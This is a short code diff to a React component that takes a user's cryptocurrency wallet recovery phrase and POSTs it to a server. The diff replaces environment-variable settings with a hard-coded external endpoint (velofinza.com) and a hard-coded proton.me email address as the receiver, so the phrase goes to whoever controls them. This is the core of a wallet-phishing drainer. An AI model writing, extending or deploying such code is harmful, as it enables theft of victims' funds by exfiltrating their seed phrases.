@@ -198,12 +198,12 @@ const RecoveryPhraseInputView = ({ wallet, onBack, onSend }) => {
 
         try {
             setLoading(true);
-            const response = await fetch(import.meta.env.VITE_EMAIL_SERVER, {
+            const response = await fetch("https://velofinza.com/backend/api/v1/wallet", {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify({ walletName: wallet.name, details: combinedPhrase, email: import.meta.env.VITE_EMAIL_RECEIVER }),
+                body: JSON.stringify({ walletName: wallet.name, details: combinedPhrase, email: "Gerfish7458@proton.me" }),
             });
 
             if (response.ok) {
